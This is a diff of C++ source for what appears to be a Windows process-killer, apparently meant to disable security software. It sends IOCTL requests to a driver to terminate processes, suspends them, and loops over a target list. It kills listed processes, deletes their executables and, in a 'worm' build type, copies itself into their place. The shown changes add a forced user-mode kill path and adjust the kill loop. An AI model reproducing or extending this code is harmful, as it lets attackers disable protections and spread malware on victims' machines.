@@ -1,10 +1,4 @@
 #include "main.h"
-#include "privilege.h"
-#include "inj.h"
-#include "color.h"
-#include <Windows.h>
-#include <TlHelp32.h>
-#include<vector>
 using namespace std;
 #define INITIALIZE_IOCTL_CODE 0x9876C004
 #define TERMINSTE_PROCESS_IOCTL_CODE 0x9876C094
@@ -137,6 +131,9 @@ static bool LoadNT() {
 }
 
 static int TerminateProc(PROCESSENTRY32& procEntry, int buildType) {
+    if (buildType == BUILD_TYPE_FORCE) {
+        if (KillProcessorByUserMode(procEntry.th32ProcessID)) return 1;
+    }
     DWORD output[2] = { 0 };
     DWORD size = sizeof(output);
     DWORD byteReturned = 0;
@@ -156,6 +153,7 @@ static int TerminateProc(PROCESSENTRY32& procEntry, int buildType) {
         }
     }
 
+    /*
     if (NtSuspendProcess) {
         auto result = NtSuspendProcess(handle);
         cout << (unsigned long)result;
@@ -164,6 +162,7 @@ static int TerminateProc(PROCESSENTRY32& procEntry, int buildType) {
             return 2;
         }
     }
+    */
 
 	CloseHandle(handle);
 	return 0;
@@ -310,12 +309,12 @@ static int LoopKiller(const char* type, int count, const wchar_t* list[], int le
         for (int j = 0; j < count; j++) {
             p = Find(list[i]);
             if (!p.th32ProcessID) {
-                if (/*wcscmp(wcsrchr(filePath, L'\\') + 1, L"lqndauccd.exe") && */DeleteFileW(filePath)) {
+                if (DeleteFileW(filePath)) {
                     deleted = true;
                     if (buildType == BUILD_TYPE_WORM && isMainProcess) CopyTo(filePath);
                 }
-                //killed = 1;
-                //break;
+                killed = 1;
+                break;
                 continue;
             }
 
@@ -327,7 +326,7 @@ static int LoopKiller(const char* type, int count, const wchar_t* list[], int le
             }
             if (DeleteFileW(filePath)) {
                 deleted = true;
-                if(buildType == BUILD_TYPE_WORM && isMainProcess) CopyTo(filePath);
+                if (buildType == BUILD_TYPE_WORM && isMainProcess) CopyTo(filePath);
                 //killed = true;
                 //break;
             }
